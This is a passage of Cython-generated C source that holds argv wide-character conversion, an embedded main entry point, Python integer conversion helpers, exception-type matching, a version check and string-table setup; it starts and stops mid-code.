        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
